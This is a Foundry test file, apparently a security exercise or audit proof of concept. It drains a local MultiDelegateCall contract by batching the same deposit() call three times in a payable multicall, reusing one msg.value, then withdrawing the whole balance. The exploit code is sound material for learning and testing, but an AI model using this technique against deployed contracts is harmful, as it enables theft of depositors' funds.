// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test, console} from "lib/forge-std/src/Test.sol";
import {MultiDelegateCall} from "../src/MultiDelegateCall.sol";

contract MultiDelegateCallPWN is Test {
    MultiDelegateCall target;
    address dep1 = vm.addr(1);
    address dep2 = vm.addr(2);
    address alice = vm.addr(3);

    function setUp() public {
        target = new MultiDelegateCall();
        hoax(dep1, 1 ether);
        target.deposit{value: 1 ether}();
        hoax(dep2, 1 ether);
        target.deposit{value: 1 ether}();
    }

    // Attack Path:
    // 1. call the deposit function using multicall
    // 2. pass the same encoded deposit call multiple times in the data parameter
    // 3. withdraw

    function testPWN() public {
        bytes memory depositSignature = abi.encodeWithSignature("deposit()");
        bytes[] memory data = new bytes[](3);
        data[0] = depositSignature;
        data[1] = depositSignature;
        data[2] = depositSignature;

        hoax(alice, 1 ether);
        target.multicall{value: 1 ether}(data);
        vm.prank(alice);
        target.withdraw(address(target).balance);
        assertEq(address(alice).balance, 3 ether);
    }
}